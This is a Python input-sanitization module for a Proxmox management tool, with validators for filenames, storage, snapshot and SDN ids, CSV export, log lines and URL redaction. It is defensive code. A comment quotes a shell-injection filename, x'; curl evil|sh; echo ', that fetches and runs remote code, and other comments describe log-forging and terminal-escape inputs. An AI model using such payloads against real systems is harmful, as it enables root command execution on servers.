# -*- coding: utf-8 -*-
"""
PegaProx Input Sanitization - Layer 2
"""

import logging
import re
import html

# NS: split from monolith - these were scattered all over the place before


def sanitize_string(value: str, max_length: int = 1000, allow_html: bool = False) -> str:
    """sanitize string input, escape html by default"""
    if not isinstance(value, str):
        value = str(value) if value is not None else ''
    
    # Truncate to max length
    value = value[:max_length]
    
    # Strip null bytes and other control characters (0x0b = vertical tab, 0x0c = form feed)
    # MK: the regex looks scary but its just ASCII C0 control chars minus \t \n \r
    value = re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]', '', value)
    
    # Escape HTML if not allowed
    if not allow_html:
        value = html.escape(value)
    
    return value.strip()


def sanitize_identifier(value: str, max_length: int = 64) -> str:
    """sanitize identifier - alphanumeric, underscore, hyphen, dot only"""
    if not isinstance(value, str):
        value = str(value) if value is not None else ''
    
    # Only allow safe characters
    value = re.sub(r'[^a-zA-Z0-9_\-\.]', '', value)
    
    return value[:max_length]


def sanitize_username(value: str, max_length: int = 64) -> str:
    """sanitize username — allows @ for email-style logins"""
    if not isinstance(value, str):
        value = str(value) if value is not None else ''
    value = re.sub(r'[^a-zA-Z0-9_\-\.@\+]', '', value)
    return value[:max_length]


def sanitize_int(value, default: int = 0, min_val: int = None, max_val: int = None) -> int:
    """Sanitize an integer input"""
    try:
        result = int(value)
        if min_val is not None and result < min_val:
            result = min_val
        if max_val is not None and result > max_val:
            result = max_val
        return result
    except (ValueError, TypeError):
        return default


def sanitize_bool(value, default: bool = False) -> bool:
    """Sanitize a boolean input"""
    if isinstance(value, bool):
        return value
    if isinstance(value, str):
        return value.lower() in ('true', '1', 'yes', 'on')
    if isinstance(value, int):
        return value != 0
    return default


def validate_email(email: str) -> bool:
    """Validate email format"""
    if not email or not isinstance(email, str):
        return False
    # Simple regex - not perfect but catches most issues
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return bool(re.match(pattern, email))


def validate_hostname(hostname: str) -> bool:
    """Validate hostname/IP format"""
    if not hostname or not isinstance(hostname, str):
        return False
    # Allow IP addresses and hostnames
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    hostname_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$'
    return bool(re.match(ip_pattern, hostname) or re.match(hostname_pattern, hostname))


def validate_storage_name(storage) -> bool:
    """Validate Proxmox / XCP-ng storage identifier.

    PVE/XCP storage names are alphanumeric + dash + underscore + dot. Anything
    outside that set has no legitimate use in our context and reaching us is a
    sign of an injection attempt against the `pvesm` / `qm` shell calls that
    embed the storage name. MK May 2026 (Aikido #481 port — original PR was
    closed-superseded by mistake; manually ported after re-review.)
    """
    if not storage or not isinstance(storage, str):
        return False
    # Must start with alphanumeric, 1-100 chars total, set: [A-Za-z0-9._-]
    pattern = r'^[a-zA-Z0-9][a-zA-Z0-9_\-\.]{0,99}$'
    return bool(re.match(pattern, storage))


# NS Jul 2026 (pentest CRIT) — ISO/template filenames flow UNESCAPED into SSH
# shell commands on PVE nodes (sync_content_to_nodes: `test -f '<path>/<filename>'`,
# scp/sftp relay). They are only single-quoted, so a filename containing a quote
# (`x'; curl evil|sh; echo '`) breaks out → root RCE on every node, reachable by a
# low-priv storage.upload holder. A PVE ISO/vztmpl filename is a single path
# component of [A-Za-z0-9._+-] (e.g. debian-12.iso, ubuntu_22.04-1_amd64.tar.zst) —
# reject anything else (no '/', no spaces, no shell metachars) and fail closed.
_CONTENT_FILENAME_RE = re.compile(r'^[A-Za-z0-9][A-Za-z0-9._+\-]{0,254}$')

def validate_content_filename(value) -> bool:
    """True if `value` is a safe single ISO/template filename for the content-sync
    shell path (one component, no '/'/space/shell-metachars). Empty → False."""
    if not value or not isinstance(value, str):
        return False
    return bool(_CONTENT_FILENAME_RE.match(value))


# NS 2026-06-05 (security audit C-2/M-2): ESXi datastore names and VM-directory
# names flow UNQUOTED into root shell commands on the PVE node (sshfs mounts,
# qemu-img, find). VMware allows letters/digits/space and a small punctuation
# set in these; a single component never contains '/'. Anything with shell
# metacharacters (; | & $ ` < > newlines quotes backslash) or a slash is an
# injection attempt against the V2P shell pipeline — reject it hard, fail closed.
_ESXI_NAME_RE = re.compile(r'^[A-Za-z0-9][A-Za-z0-9 ._()+\-]{0,127}$')

def validate_esxi_path_component(value) -> bool:
    """True if `value` is a safe single ESXi datastore / directory name.

    NOT a full path — one path component only (no '/'). Used to gate the
    user-supplied esxi_datastore / esxi_vm_dir before they reach the V2P
    SSHFS + qemu-img shell calls. Empty is rejected; callers that allow
    auto-detect must check for empty BEFORE calling this.
    """
    if not value or not isinstance(value, str):
        return False
    return bool(_ESXI_NAME_RE.match(value))


# MK Sep 2026 (audit CRIT) — a snapshot name goes straight into the PVE API path
# (.../{vmid}/snapshot/{snapname}), and the authz gate in front of those routes only ever
# validates the vmid. So a name carrying dot-segments walked out of the guest the caller owns
# and reached arbitrary PVE endpoints as the cluster's stored root ticket — five `../` from
# the snapshot path lands on /access/users, and the verb is DELETE. The portal grew a private
# copy of this check when the same bug was found there; the dashboard twins never got it, so
# it lives here now and the sinks in manager.py enforce it for every caller.
# PVE's own snapshot-name rule is [A-Za-z][A-Za-z0-9_-]*, so nothing legitimate is refused.
_SNAPSHOT_NAME_RE = re.compile(r'^[A-Za-z][A-Za-z0-9_\-]{0,62}$')


def validate_snapshot_name(value) -> bool:
    """True if `value` is a legitimate PVE snapshot name (one path segment, no dot-segments).

    Empty is rejected; a caller that means "the running config" must check for PVE's synthetic
    'current' before calling this."""
    if not value or not isinstance(value, str):
        return False
    return bool(_SNAPSHOT_NAME_RE.match(value))


# MK Sep 2026 - SDN object ids arrive as a URL path segment and are then interpolated into
# the PVE API path, which we speak with the cluster's stored root credential. requests
# resolves dot segments before it sends, so an id of ".." moves the whole PUT or DELETE one
# level up the SDN tree - the same shape as the snapshot-name traversal, caught earlier this
# time because the router will not pass a slash. Proxmox publishes the grammar itself
# (pve-sdn-vnet-id is [a-zA-Z][a-zA-Z0-9]*[a-zA-Z0-9]); dash and underscore are allowed here
# too so an id someone already created is not suddenly refused. A dot never is.
_SDN_ID_RE = re.compile(r'^[A-Za-z][A-Za-z0-9_\-]{0,62}$')


def validate_sdn_id(value) -> bool:
    """True if `value` is usable as a single PVE SDN path segment (zone, vnet, fabric,
    controller, ipam, dns). Rejects dot segments, empties and anything with a separator."""
    if not value or not isinstance(value, str):
        return False
    return bool(_SDN_ID_RE.match(value))


def sanitize_csv_field(value) -> str:
    """Sanitize field for CSV export to prevent formula injection.
    
    Neutralizes leading characters (=, +, -, @, tab, carriage return) that
    spreadsheet applications interpret as formula prefixes. Prepends a single
    quote to force literal interpretation while preserving the original value.
    
    References:
    - OWASP: https://owasp.org/www-community/attacks/CSV_Injection
    - CWE-1236: Improper Neutralization of Formula Elements in a CSV File
    """
    if value is None:
        return ''
    
    # Convert to string
    s = str(value)
    
    # Check if the field starts with a formula-triggering character
    # =, +, -, @ are the primary formula prefixes
    # \t (tab) and \r (carriage return) can also be exploited in some contexts
    if s and s[0] in ('=', '+', '-', '@', '\t', '\r'):
        # Prepend single quote to force literal interpretation
        # This is the recommended mitigation per OWASP guidance
        return "'" + s

    return s


# everything in C0 except tab, DEL, and the C1 range - ESC among them, which is what
# every ANSI sequence starts with
_CONTROL_CHARS_RE = re.compile(r'[\x00-\x08\x0b-\x0c\x0e-\x1f\x7f-\x9f]')


def sanitize_log_message(value) -> str:
    """Strip CR/LF from a value before writing it to the text audit log.

    Without this, an attacker who controls any audit field (e.g. submits a
    username containing `\\nAudit: admin - deleted_everything`) could inject
    a fake-looking log line and confuse anyone tailing the file. The DB
    record stores the unmodified value, so this only sanitises the text
    stream.

    CWE-117 / OWASP Log Injection.
    """
    if value is None:
        return ''
    # MK May 2026 - cheap str-replace, called on every audit log write.
    # Also strips the unicode line separators U+2028/U+2029 which some viewers
    # (and json.dumps without ensure_ascii) treat as newlines. Tab is left
    # alone (legitimate in some action strings).
    s = str(value)
    s = s.replace('\r', ' ').replace('\n', ' ')
    s = s.replace('\u2028', ' ').replace('\u2029', ' ')
    # MK Sep 2026 - and the rest of the control range. A name carrying \x1b[2K\r does not
    # just add a line, it rewrites what the operator sees in their terminal: erase the
    # line, move the cursor, repaint something else, set the window title. Stripping CR
    # and LF stopped the forged LINE and left the forged SCREEN. Tab stays: it is
    # legitimate in action strings and cannot move a cursor about.
    return _CONTROL_CHARS_RE.sub(' ', s)




def bounded_list(value, max_items=256, max_length=253, dedupe=True, name='list'):
    """A list that came out of a request body, bounded in both directions.

    Ten endpoints took a list from the caller, checked at most that it WAS a list, and
    persisted it: fallback hosts, excluded nodes, cluster reorder, affinity-rule members,
    multipath nodes, PBS cluster links, template metadata, pool members, VM tags. None of
    them bounded the item count or the item length, so one request could store a million
    entries of a megabyte each - durably, and then reload them into memory on every start.
    Duplicates matter too: several of these fan out one request per entry.

    Returns (cleaned, error). `error` is None when it is fine, otherwise a sentence for
    the 400. MK Sep 2026
    """
    if value is None:
        return [], None
    if not isinstance(value, (list, tuple)):
        return None, f'{name} must be a list'
    if len(value) > max_items:
        return None, f'{name} accepts at most {max_items} entries ({len(value)} given)'
    out, seen = [], set()
    for item in value:
        if item is None or isinstance(item, (dict, list, tuple, bool)):
            return None, f'{name} entries must be plain strings or numbers'
        text = str(item).strip()
        if not text:
            continue
        if len(text) > max_length:
            return None, f'{name} entries are limited to {max_length} characters'
        if dedupe:
            if text in seen:
                continue
            seen.add(text)
        out.append(text)
    return out, None


# Query parameters that carry a credential in practice. Matched case-insensitively
# against the parameter NAME, so `?api_key=` and `?X-Amz-Signature=` both go.
_SECRET_PARAM_HINTS = ('token', 'key', 'secret', 'password', 'passwd', 'pwd',
                       'sig', 'signature', 'credential', 'auth')


def redact_url(value):
    """Make a URL safe to write into a log line.

    Eight findings said the same thing from different files: a URL gets logged when a
    request fails, and the URL is the credential. `https://user:pass@host/` keeps the
    password in netloc - urlsplit().netloc includes userinfo, which is how the SIEM TLS
    warning ended up printing one. A Slack or Teams webhook URL has no userinfo at all;
    the secret IS the path. And a pre-signed download URL carries it in the query.

    So all three go: userinfo, the query values of anything that looks like a secret,
    and any path beyond the first segment. Enough is left to tell which endpoint failed,
    which is what the operator reading the log actually needs.

    Anything that does not parse as a URL is returned unchanged - callers pass whole
    exception strings through here. MK Sep 2026
    """
    if not value:
        return value
    text = str(value)

    def _one(m):
        scheme, userinfo, host, rest = m.group(1), m.group(2), m.group(3), m.group(4) or ''
        out = f'{scheme}://'
        if userinfo:
            out += '[REDACTED]@'
        out += host
        path, sep, query = rest.partition('?')
        segments = [s for s in path.split('/') if s]
        if segments:
            out += '/' + segments[0]
            if len(segments) > 1:
                out += '/[REDACTED]'
        if sep:
            parts = []
            for pair in query.split('&'):
                name, eq, _val = pair.partition('=')
                if eq and any(h in name.lower() for h in _SECRET_PARAM_HINTS):
                    parts.append(f'{name}=[REDACTED]')
                else:
                    parts.append(pair)
            out += '?' + '&'.join(parts)
        return out

    return re.sub(
        r'(https?)://(?:([^/@\s]+)@)?([A-Za-z0-9_.\-:\[\]]+)([^\s\'"<>]*)',
        _one, text)


class LogInjectionFilter(logging.Filter):
    """Neutralise control characters on every log record, at the sink.

    Fourteen findings named fourteen files for the same thing: a name, a URL, an error
    string the caller chose ends up in a log line, and CR/LF lets them forge a line
    while ESC lets them repaint the operator's terminal. Wrapping the call sites means
    seventy-five edits and a seventy-sixth that somebody forgets next month, so this
    sits on the root logger instead and covers the ones written after today too.

    Deliberately only `msg` and `args`. A traceback arrives through exc_info and is
    appended by the formatter afterwards, so it keeps its newlines - it is ours, not
    the caller's, and an unreadable traceback helps nobody. MK Sep 2026
    """

    def filter(self, record):
        if isinstance(record.msg, str):
            record.msg = sanitize_log_message(record.msg)
        if record.args:
            if isinstance(record.args, dict):
                record.args = {k: (sanitize_log_message(v) if isinstance(v, str) else v)
                               for k, v in record.args.items()}
            elif isinstance(record.args, tuple):
                record.args = tuple(sanitize_log_message(a) if isinstance(a, str) else a
                                    for a in record.args)
        return True


def install_log_injection_filter(logger=None):
    """Attach the filter to a logger's handlers (root by default). Idempotent."""
    target = logger if logger is not None else logging.getLogger()
    for handler in target.handlers:
        if not any(isinstance(f, LogInjectionFilter) for f in handler.filters):
            handler.addFilter(LogInjectionFilter())
    return target
